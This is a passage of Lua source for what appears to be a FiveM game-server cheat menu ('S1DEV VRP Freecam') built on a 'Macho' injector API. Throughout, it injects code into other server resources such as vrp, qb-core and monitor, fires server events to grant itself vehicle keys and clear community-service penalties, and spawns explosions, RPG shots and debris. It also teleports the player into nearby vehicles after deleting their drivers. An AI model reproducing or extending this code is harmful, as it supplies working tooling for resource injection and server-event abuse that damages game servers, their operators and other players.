            if not IsEntityPlayingAnim(playerPed, fallAnimDict, fallAnim, 3) then
                TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
            end

            if not IsPedRagdoll(playerPed) then
                SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
            end
        end
    end
end)

-- ============================================================
-- S1DEV VRP FREECAM V4 (Bigger Text + Fixed Spawn)
-- ============================================================

-- Freecam Variables
local cam_active = false
local cam = nil
local isFreeCamEnabled = false
local TeleportMarkerCoords = nil

-- Features
local Features = {
    "Select",
    "Teleportation",
    "Weapon Shot",
    "RPG",
    "Explosion",
    "Shoot Car",
    "Shoot Boat",
    "Shoot Plane",
    "Map Destroy"
}

local current_feature = 1

-- Weapon list for Weapon Shot feature
local Weapons = {
    "WEAPON_PISTOL",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_MICROSMG",
    "WEAPON_SMG",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MINISMG",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_CARBINERIFLE",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MINIGUN",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_RPG",
    "WEAPON_STINGER",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_GRENADE",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_BZGAS",
    "WEAPON_MOLOTOV",
    "WEAPON_PETROLCAN",
    "WEAPON_FLARE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_PIPEBOMB"
}

local currentWeaponIndex = 1

-- Vehicle sub-features (for switching between vehicles)
local CarModels = {"adder", "zentorno", "t20", "nero", "fmj", "sultan", "kuruma2", "entityxf", "osiris", "reaper"}
local BoatModels = {"dinghy", "jetmax", "suntrap", "tropic", "seashark", "squalo", "marquis", "predator"}
local PlaneModels = {"lazer", "hydra", "besra", "vestra", "nimbus", "shamal", "duster", "mammatus", "velum", "stunt"}

local currentCarIndex = 1
local currentBoatIndex = 1
local currentPlaneIndex = 1

-- Map Destroy Objects (With switching)
local MapDestroyObjects = {
    "prop_loopile_06",
    "dt1_05_build1_damage",
    "hei_dt1_tcmodzito",
    "sum_prop_dufocore_01a",
    "sr_prop_stunt_tube_xs_02a",
    "xs_propint2_set_scifi_10",
    "prop_crate_02a",
    "xs_prop_arena_turret_01a_wl",
    "xs_prop_arena_podium_02a",
    "prop_air_bigradar",
    "xs_prop_arena_barrel_01a_sf",
    "prop_church_01",
    "prop_cs_crane_arm",
    "xs_prop_arena_turntable_01a_wl",
    "prop_cstl_twr_b",
    "prop_skid_tent_01",
    "xs_prop_hamburgher_wl",
    "prop_container_01a",
    "prop_contnr_pile_01a",
    "stt_prop_stunt_track_start",
    "stt_prop_stunt_track_dwuturn",
    "xs_prop_arena_podium_02a",
    "prop_rock_1_b",
    "xs_prop_arena_barrel_01a_sf",
    "prop_rock_4_b",
    "stt_prop_stunt_tube_fn_05",
    "csx_seabedrock3",
    "hei_prop_carrier_jet",
    "prop_windmill_01",
    "dt1_02_build1_damage",
    "p_oil_pjack_01_amo",
    "stt_prop_stunt_tube_l",
    "xs_terrain_dyst_ground_07",
    "prop_tyre_9",
    "prop_tree_01",
    "prop_tree_02",
    "stt_prop_stunt_tube_fn_02"
}

local currentMapIndex = 1

-- ============================================================
-- FREECAM FUNCTIONS
-- ============================================================

function RotationToDirection(rot)
    local radZ = math.rad(rot.z)
    local radX = math.rad(rot.x)
    local cosX = math.cos(radX)
    return vector3(
        -math.sin(radZ) * cosX,
        math.cos(radZ) * cosX,
        math.sin(radX)
    )
end

function ToggleFreeCam()
    cam_active = not cam_active
    if cam_active then
        local gameplay_cam_coords = GetGameplayCamCoord()
        local gameplay_cam_rot = GetGameplayCamRot()
        cam = CreateCamWithParams(
            "DEFAULT_SCRIPTED_CAMERA",
            gameplay_cam_coords.x,
            gameplay_cam_coords.y,
            gameplay_cam_coords.z,
            gameplay_cam_rot.x,
            gameplay_cam_rot.y,
            gameplay_cam_rot.z,
            50.0
        )
        SetCamActive(cam, true)
        RenderScriptCams(true, false, 200, false, false)
        
        SetEntityVisible(PlayerPedId(), false, false)
        FreezeEntityPosition(PlayerPedId(), true)
    else
        if cam then
            SetCamActive(cam, false)
            RenderScriptCams(false, true, 0, false, false)
            DestroyCam(cam)
            cam = nil
        end
        ClearFocus()
        SetFocusEntity(PlayerPedId())
        SetEntityVisible(PlayerPedId(), true, false)
        FreezeEntityPosition(PlayerPedId(), false)
        NetworkSetFriendlyFireOption(true)
        SetCanAttackFriendly(PlayerPedId(), true, true)
        EnableAllControlActions(0)
        EnableAllControlActions(1)
    end
end

function CloseFreeCam()
    if cam_active and cam then
        cam_active = false
        SetCamActive(cam, false)
        RenderScriptCams(false, true, 0, false, false)
        DestroyCam(cam)
        cam = nil
        ClearFocus()
        SetFocusEntity(PlayerPedId())
        SetEntityVisible(PlayerPedId(), true, false)
        FreezeEntityPosition(PlayerPedId(), false)
        NetworkSetFriendlyFireOption(true)
        SetCanAttackFriendly(PlayerPedId(), true, true)
        EnableAllControlActions(0)
        EnableAllControlActions(1)
    end
end

function draw_center_dot()
    local res_x, res_y = GetActiveScreenResolution()
    DrawRect(0.5, 0.5, 2.0 / res_x, 2.0 / res_y, 255, 255, 255, 255)
end

function draw_freecam_circle()
    local segments = 80
    local radius = 0.6
    local centerX = 0.5
    local centerY = 0.5
    local step = (2.0 * math.pi) / segments
    local prevX = centerX + radius
    local prevY = centerY

    for i = 1, segments do
        local angle = i * step
        local newX = centerX + radius * math.cos(angle)
        local newY = centerY + radius * math.sin(angle)
        DrawLine(prevX, prevY, 0.0, newX, newY, 0.0, 255, 255, 255, 180)
        prevX = newX
        prevY = newY
    end
end

-- ============================================================
-- WEAPON SHOT FUNCTION (Keeps weapon on you)
-- ============================================================

local function FireWeaponAtTarget(coords, dir, weaponName)
    local weaponHash = GetHashKey(weaponName)
    local playerPed = PlayerPedId()
    
    local hasWeapon = HasPedGotWeapon(playerPed, weaponHash, false)
    
    RequestWeaponAsset(weaponHash, 31, 0)
    local timeout = 0
    while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
        Wait(10)
        timeout = timeout + 1
    end
    
    if HasWeaponAssetLoaded(weaponHash) then
        if not hasWeapon then
            GiveWeaponToPed(playerPed, weaponHash, 999, false, true)
        end
        
        SetCurrentPedWeapon(playerPed, weaponHash, true)
        Citizen.Wait(0)
        
        local endCoords = coords + dir * 500.0
        
        ShootSingleBulletBetweenCoords(
            coords.x, coords.y, coords.z,
            endCoords.x, endCoords.y, endCoords.z,
            100, true, weaponHash, playerPed, true, false, 1000.0
        )
        
        return true
    end
    return false
end

-- ============================================================
-- SPAWN VEHICLE WITH MONITOR METHOD (VRP + QB-Core)
-- ============================================================

local function SpawnVehicleWithMonitor(coords, dir, modelName)
    local targetResource = nil
    if GetResourceState('vrp') == "started" then
        targetResource = 'vrp'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    elseif GetResourceState('ox_inventory') == "started" then
        targetResource = 'ox_inventory'
    else
        targetResource = 'monitor'
    end
    
    MachoInjectResource(targetResource, string.format([[
        local vehicleModel = "%s"
        local spawnX = %f
        local spawnY = %f
        local spawnZ = %f
        local dirX = %f
        local dirY = %f
        local dirZ = %f
        
        -- Request model
        local modelHash = GetHashKey(vehicleModel)
        RequestModel(modelHash)
        local timeout = 0
        while not HasModelLoaded(modelHash) and timeout < 100 do
            Citizen.Wait(10)
            timeout = timeout + 1
        end
        
        if HasModelLoaded(modelHash) then
            -- Spawn vehicle at target location
            local vehicle = CreateVehicle(modelHash, spawnX, spawnY, spawnZ + 5.0, math.random(0, 360), true, false)
            
            if DoesEntityExist(vehicle) then
                -- Set vehicle properties
                SetEntityVelocity(vehicle, dirX * 60.0, dirY * 60.0, math.random(10, 30))
                SetEntityAsMissionEntity(vehicle, true, true)
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleEngineOn(vehicle, true, true, false)
                
                -- Set color
                SetVehicleCustomPrimaryColour(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
                SetVehicleCustomSecondaryColour(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
                
                -- Give keys (QB-Core)
                if GetResourceState('qb-core') == "started" then
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerServerEvent('qb-vehiclekeys:server:addKey', plate)
                    TriggerServerEvent('qb-vehiclekeys:server:giveKey', plate, GetPlayerServerId(PlayerId()))
                end
                
                -- Give keys (VRP)
                if GetResourceState('vrp') == "started" then
                    TriggerEvent('vrp:vehicle:keys', vehicle, true)
                end
                
                -- Give keys (Generic)
                TriggerEvent('vehiclekeys:client:SetOwner', GetVehicleNumberPlateText(vehicle))
                
                print("Vehicle spawned with keys: " .. vehicleModel)
                TriggerEvent('chat:addMessage', { args = { '^2Freecam:', 'Spawned ' .. vehicleModel .. ' with keys!' } })
            end
            
            SetModelAsNoLongerNeeded(modelHash)
        else
            TriggerEvent('chat:addMessage', { args = { '^1Freecam:', 'Failed to spawn ' .. vehicleModel } })
        end
    ]], modelName, coords.x, coords.y, coords.z, dir.x, dir.y, dir.z))
    
    MachoMenuNotification("Freecam", "Spawning: " .. modelName)
end

-- ============================================================
-- MAP DESTROY FUNCTION
-- ============================================================

local function MapDestroySingle(coords, objModel)
    local hash = GetHashKey(objModel)
    RequestModel(hash)
    local timeout = 0
    while not HasModelLoaded(hash) and timeout < 50 do
        Wait(10)
        timeout = timeout + 1
    end
    
    if HasModelLoaded(hash) then
        local angle = math.random() * 2 * math.pi
        local radius = math.random(5, 25)
        local x = coords.x + math.cos(angle) * radius
        local y = coords.y + math.sin(angle) * radius
        local z = coords.z + math.random(0, 15)
        
        local obj = CreateObject(hash, x, y, z, true, true, true)
        if DoesEntityExist(obj) then
            SetEntityAsMissionEntity(obj, true, true)
            SetEntityCollision(obj, true, true)
            SetEntityVelocity(obj, math.random(-10, 10), math.random(-10, 10), math.random(15, 50))
            SetModelAsNoLongerNeeded(hash)
            return obj
        end
        SetModelAsNoLongerNeeded(hash)
    end
    return nil
end

-- ============================================================
-- MAIN FREECAM THREAD
-- ============================================================

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        if IsControlJustPressed(0, 74) then -- Page Up
            if isFreeCamEnabled then
                NetworkSetFriendlyFireOption(true)
                SetCanAttackFriendly(PlayerPedId(), true, true)
                EnableAllControlActions(0)
                EnableAllControlActions(1)
                ToggleFreeCam()
            end
        end

        if not isFreeCamEnabled and cam_active then
            CloseFreeCam()
        end

        if cam_active and cam then
            local coords = GetCamCoord(cam)
            local rot = GetCamRot(cam)
            local dir = RotationToDirection(rot)

            local shift = IsControlPressed(0, 21)
            local speed = shift and 5.0 or 0.5

            if IsControlPressed(0, 32) then -- W
                coords = coords + dir * speed
            elseif IsControlPressed(0, 33) then -- S
                coords = coords - dir * speed
            end
            if IsControlPressed(0, 34) then -- A
                coords = coords + vector3(-dir.y, dir.x, 0.0) * speed
            elseif IsControlPressed(0, 35) then -- D
                coords = coords + vector3(dir.y, -dir.x, 0.0) * speed
            end
            SetCamCoord(cam, coords.x, coords.y, coords.z)

            local h_move = GetControlNormal(0, 1) * 4
            local v_move = GetControlNormal(0, 2) * 4
            if h_move ~= 0.0 or v_move ~= 0.0 then
                SetCamRot(cam, rot.x - v_move, rot.y, rot.z - h_move)
            end

            TaskStandStill(PlayerPedId(), 10)
            SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

            local handle = StartExpensiveSynchronousShapeTestLosProbe(
                coords.x, coords.y, coords.z,
                coords.x + dir.x * 500.0,
                coords.y + dir.y * 500.0,
                coords.z + dir.z * 500.0,
                -1, PlayerPedId()
            )
            local _, hit, end_coords, _, entityHit = GetShapeTestResult(handle)

            -- Feature switching with Q/E
            if IsControlJustPressed(0, 44) then -- Q
                current_feature = current_feature - 1
                if current_feature < 1 then current_feature = #Features end
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
            end
            
            if IsControlJustPressed(0, 38) then -- E
                current_feature = current_feature + 1
                if current_feature > #Features then current_feature = 1 end
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
            end

            -- Sub-feature switching with Arrow Keys
            local feature = Features[current_feature]
            
            if feature == "Weapon Shot" then
                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
                    currentWeaponIndex = currentWeaponIndex - 1
                    if currentWeaponIndex < 1 then currentWeaponIndex = #Weapons end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
                    currentWeaponIndex = currentWeaponIndex + 1
                    if currentWeaponIndex > #Weapons then currentWeaponIndex = 1 end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                
            elseif feature == "Shoot Car" then
                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
                    currentCarIndex = currentCarIndex - 1
                    if currentCarIndex < 1 then currentCarIndex = #CarModels end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
                    currentCarIndex = currentCarIndex + 1
                    if currentCarIndex > #CarModels then currentCarIndex = 1 end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                
            elseif feature == "Shoot Boat" then
                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
                    currentBoatIndex = currentBoatIndex - 1
                    if currentBoatIndex < 1 then currentBoatIndex = #BoatModels end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
                    currentBoatIndex = currentBoatIndex + 1
                    if currentBoatIndex > #BoatModels then currentBoatIndex = 1 end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                
            elseif feature == "Shoot Plane" then
                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
                    currentPlaneIndex = currentPlaneIndex - 1
                    if currentPlaneIndex < 1 then currentPlaneIndex = #PlaneModels end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
                    currentPlaneIndex = currentPlaneIndex + 1
                    if currentPlaneIndex > #PlaneModels then currentPlaneIndex = 1 end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                
            elseif feature == "Map Destroy" then
                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
                    currentMapIndex = currentMapIndex - 1
                    if currentMapIndex < 1 then currentMapIndex = #MapDestroyObjects end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
                    currentMapIndex = currentMapIndex + 1
                    if currentMapIndex > #MapDestroyObjects then currentMapIndex = 1 end
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                end
            end

            -- ============================================================
            -- DRAW UI - BIGGER TEXT (Scale 0.8 for bigger text)
            -- ============================================================
            SetTextFont(4)
            SetTextProportional(1)
            SetTextScale(0.0, 0.8)  -- BIGGER TEXT (was 0.425)
            SetTextColour(0, 255, 255, 255)
            SetTextOutline()
            SetTextCentre(true)
            SetTextEntry("STRING")
            
            -- Show current selection
            local displayText = "[" .. Features[current_feature] .. "]"
            if feature == "Weapon Shot" then
                local weaponName = Weapons[currentWeaponIndex]
                local displayName = GetLabelText(weaponName)
                if displayName == "NULL" or displayName == "" then
                    displayName = weaponName:gsub("WEAPON_", "")
                end
                displayText = "[Weapon Shot: " .. displayName .. "]"
            elseif feature == "Shoot Car" then
                displayText = "[Shoot Car: " .. CarModels[currentCarIndex] .. "]"
            elseif feature == "Shoot Boat" then
                displayText = "[Shoot Boat: " .. BoatModels[currentBoatIndex] .. "]"
            elseif feature == "Shoot Plane" then
                displayText = "[Shoot Plane: " .. PlaneModels[currentPlaneIndex] .. "]"
            elseif feature == "Map Destroy" then
                displayText = "[Map Destroy: " .. MapDestroyObjects[currentMapIndex] .. "]"
            end
            
            AddTextComponentString(displayText)
            DrawText(0.5, 0.90)  -- Slightly higher position

            draw_center_dot()
            draw_freecam_circle()

            -- Execute feature on Left Click
            if IsDisabledControlJustPressed(0, 24) then
                if feature == "Select" then
                    if hit and entityHit and entityHit ~= 0 then
                        local entityType = GetEntityType(entityHit)
                        local typeName = entityType == 1 and "Ped" or entityType == 2 and "Vehicle" or entityType == 3 and "Object" or "Unknown"
                        MachoMenuNotification("Freecam", "Selected: " .. typeName)
                    end
                    
                elseif feature == "Teleportation" then
                    if hit then
                        TeleportMarkerCoords = end_coords 
                    end
                    if TeleportMarkerCoords ~= nil then
                        local playerPed = PlayerPedId()
                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        local coords = TeleportMarkerCoords

                        if vehicle and vehicle ~= 0 then
                            SetEntityCoords(vehicle, coords.x, coords.y, coords.z + 2.0, false, false, false, false)
                        else
                            SetEntityCoords(playerPed, coords.x, coords.y, coords.z + 1.0, false, false, false, false)
                        end
                
                        TeleportMarkerCoords = nil
                        MachoMenuNotification("Freecam", "Teleported!")
                    end
                    
                elseif feature == "Weapon Shot" then
                    if hit then
                        local weaponName = Weapons[currentWeaponIndex]
                        local success = FireWeaponAtTarget(coords, dir, weaponName)
                        if success then
                            MachoMenuNotification("Freecam", "Fired: " .. weaponName)
                        else
                            MachoMenuNotification("Freecam", "Failed to fire weapon")
                        end
                    end
                    
                elseif feature == "RPG" then
                    if hit then
                        local weaponHash = GetHashKey("WEAPON_RPG")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        while not HasWeaponAssetLoaded(weaponHash) do Wait(0) end
                
                        ShootSingleBulletBetweenCoords(
                            coords.x, coords.y, coords.z,
                            end_coords.x, end_coords.y, end_coords.z,
                            100, true, weaponHash, PlayerPedId(), true, false, 1000.0
                        )
                        MachoMenuNotification("Freecam", "RPG Fired!")
                    end
                    
                elseif feature == "Explosion" then
                    if hit then
                        AddExplosion(end_coords.x, end_coords.y, end_coords.z, 7, 50.0, true, false, 1.0)
                        MachoMenuNotification("Freecam", "Explosion!")
                    end
                    
                elseif feature == "Shoot Car" then
                    if hit then
                        SpawnVehicleWithMonitor(coords, dir, CarModels[currentCarIndex])
                    end
                    
                elseif feature == "Shoot Boat" then
                    if hit then
                        SpawnVehicleWithMonitor(coords, dir, BoatModels[currentBoatIndex])
                    end
                    
                elseif feature == "Shoot Plane" then
                    if hit then
                        SpawnVehicleWithMonitor(coords, dir, PlaneModels[currentPlaneIndex])
                    end
                    
                elseif feature == "Map Destroy" then
                    if hit then
                        local obj = MapDestroySingle(end_coords, MapDestroyObjects[currentMapIndex])
                        if obj then
                            MachoMenuNotification("Freecam", "Spawned: " .. MapDestroyObjects[currentMapIndex])
                        end
                    end
                end
            end
        end
    end
end)

-- S1DEV VRP Freecam Menu Checkbox
MachoMenuCheckbox(FirstSection, "S1DEV Freecam - Safe", function()
    isFreeCamEnabled = true
    if not cam_active then
        ToggleFreeCam()
    end
end, function()
    isFreeCamEnabled = false
    CloseFreeCam()
end)

MachoMenuButton(FirstSection, "Close Menu", function()
    menu = 0 
    MachoMenuDestroy(MenuWindow)
end)

-- Animation Cancel System
MachoMenuButton(FirstSection, "Animation Cancel On/Off", function()
    animCancel = not animCancel

    if animCancel then
        print("Animation cancel ACTIVE - X key")
    else
        print("Animation cancel OFF")
    end
end)

-- X key listener
CreateThread(function()
    while true do
        Wait(0)
        if animCancel and IsControlJustPressed(0, 73) then -- 73 = X
            ClearPedTasksImmediately(PlayerPedId())
        end
    end
end)

MachoMenuButton(FirstSection, "Armor - Safe", function()
    local playerPed = PlayerPedId()
    SetPedArmour(playerPed, 100)
    MachoMenuNotification("S1DEV", "Armor applied.")
end)

MachoMenuButton(FirstSection, "Clear Community Service (Safe)", function()
    MachoInjectResource("any", [[
        TriggerServerEvent('qb-communityservice:finishCommunityService', -1)
    ]])
    MachoMenuNotification("[Safe Process]", "Community service clear command applied.")
end)

-- Random Skin Button
MachoMenuButton(FirstSection, "Random Skin - Safe", function()
    local ped = PlayerPedId()
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
    MachoMenuNotification("S1DEV", "Random skin applied.")
end)

-- Tab: Vehicle Menu
local VehicleTab = MachoMenuAddTab(MenuWindow, "Vehicle Menu")

-- Group: Vehicle Creation
local VehicleSection = MachoMenuGroup(VehicleTab, "Vehicle Creation", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

-- Title: Enter Vehicle Model
MachoMenuText(VehicleSection, "Enter Vehicle Model (e.g., sultan)")

-- Vehicle model text input
local VehicleModelInput = MachoMenuInputbox(VehicleSection, "Vehicle Model", "e.g., sultan")

-- Give key status variable
local GiveKey = false

-- Get Vehicle Key? (Checkbox)
MachoMenuCheckbox(VehicleSection, "Get Vehicle Key?", function()
    GiveKey = true
end, function()
    GiveKey = false
end)

-- Vehicle Creation Button
MachoMenuButton(VehicleSection, "Create Vehicle", function()
    local modelName = MachoMenuGetInputbox(VehicleModelInput)

    if modelName and modelName ~= "" then
        MachoInjectResource('monitor', string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)
            local giveKey = %s

            if not IsModelInCdimage(modelHash) then
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Invalid model: %s' } })
                return
            end

            RequestModel(modelHash)
            while not HasModelLoaded(modelHash) do
                Wait(0)
            end

            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)

            if vehicle and vehicle ~= 0 then
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                TaskWarpPedIntoVehicle(ped, vehicle, -1)

                if giveKey then
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerEvent("vehiclekeys:client:SetOwner", plate)
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created and key given!' } })
                else
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created! (No key)' } })
                end
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Failed to create vehicle!' } })
            end

            SetModelAsNoLongerNeeded(modelHash)
        ]], modelName, tostring(GiveKey), modelName))

        if GiveKey then
            MachoMenuNotification("Vehicle System", "Vehicle created and key given!")
        else
            MachoMenuNotification("Vehicle System", "Vehicle created (No key given)!")
        end
    else
        MachoMenuNotification("Error", "Please enter a valid vehicle model!")
    end
end)

-- Fix Vehicle Button
MachoMenuButton(VehicleSection, "Fix Vehicle", function()
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if vehicle and vehicle ~= 0 then
        SetVehicleFixed(vehicle)
        SetVehicleDeformationFixed(vehicle)
        SetVehicleUndriveable(vehicle, false)
        MachoMenuNotification("Vehicle repaired.", 2500)
    else
        MachoMenuNotification("You are not in a vehicle.", 2500)
    end
end)

-- Fix Engine Button
MachoMenuButton(VehicleSection, "Fix Engine", function()
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if vehicle and vehicle ~= 0 then
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
    else
        MachoMenuNotification("You are not in a vehicle.", 2500)
    end
end)

-- Flip Vehicle Button
MachoMenuButton(VehicleSection, "Flip Vehicle", function()
    local playerPed = GetPlayerPed(-1)
    local playerVeh = GetVehiclePedIsIn(playerPed, true)

    if IsPedInAnyVehicle(playerPed, false) and GetPedInVehicleSeat(playerVeh, -1) == playerPed then
        SetVehicleOnGroundProperly(playerVeh)
        MachoMenuNotification("Vehicle flipped.", 2500)
    else
        MachoMenuNotification("You are not in the driver's seat.", 2500)
    end
end)

-- Max Tuning Button
MachoMenuButton(VehicleSection, "Max Tuning", function()
    local vehicle = GetVehiclePedIsUsing(PlayerPedId(-1))
    if vehicle and vehicle ~= 0 then
        SetVehicleModKit(vehicle, 0)
        for modType = 0, 49 do
            local maxMod = GetNumVehicleMods(vehicle, modType) - 1
            if maxMod >= 0 then
                SetVehicleMod(vehicle, modType, maxMod, false)
            end
        end
        SetVehicleWindowTint(vehicle, 1)
        SetVehicleTyresCanBurst(vehicle, false)
        MachoMenuNotification("Vehicle max tuned!", 2500)
    else
        MachoMenuNotification("You are not in a vehicle!", 2500)
    end
end)

-- Teleport to Nearest Vehicle Button
MachoMenuButton(VehicleSection, "TP to Nearest Vehicle", function()
    local playerPed = GetPlayerPed(-1)
    local playerPedPos = GetEntityCoords(playerPed, true)
    local NearestVehicle = GetClosestVehicle(playerPedPos, 1000.0, 0, 4)
    local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
    local NearestPlane = GetClosestVehicle(playerPedPos, 1000.0, 0, 16384)
    local NearestPlanePos = GetEntityCoords(NearestPlane, true)
    MachoMenuNotification("~y~Waiting...", 1000)
    Citizen.Wait(1000)
    if (NearestVehicle == 0) and (NearestPlane == 0) then
        MachoMenuNotification("~b~No vehicle found", 2500)
    elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
        if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
        else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
        end
        MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
    elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
        if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
        else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
        end
        MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
    else
        local vehicleDistance = #(playerPedPos - NearestVehiclePos)
        local planeDistance = #(playerPedPos - NearestPlanePos)
        if vehicleDistance < planeDistance then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
        else
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
